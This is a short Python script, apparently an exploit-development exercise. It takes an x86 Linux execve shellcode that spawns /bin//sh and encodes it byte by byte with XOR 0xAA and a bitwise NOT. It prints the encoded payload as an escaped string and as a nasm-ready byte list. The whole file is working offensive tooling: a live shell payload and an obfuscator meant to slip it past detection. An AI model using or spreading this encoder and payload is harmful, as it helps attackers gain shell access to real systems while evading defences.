#!/usr/bin/python3
from termcolor import colored

# objdump output for the execve-stack binary that executes /bin//sh

shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


# Set up some named variables

shellcode_encode = ""

x86_encode = ""

# For loop to do the actual obfuscation

for i in bytearray(shellcode):


	# XOR the shifted value with 0xAA
	xor = i^0xAA

	# Perform NOT operation on XOR value
	complement = ~xor

	# Start the shellcode output bytes with "\x"
	shellcode_encode += "\\x"

	# Create hex format
	shellcode_encode += "%02x" % (complement & 0xff)

	# Create format for nasm file
	x86_encode += "0x"

	x86_encode += "%02x," % (complement & 0xff)


# Print results

print(colored("[+]", 'green')+" Your encoded shellcode sir: \n\n" + colored(shellcode_encode+ "\n", 'green', attrs=['bold']))
print(colored("[+]", 'green')+" Your encoded shellcode for you nasm file: \n\n" + colored(x86_encode + "\n", 'green', attrs=['bold']))
print(colored("[+]", 'green')+ " The shellcode length for your information: %d" % len(bytearray(shellcode)))

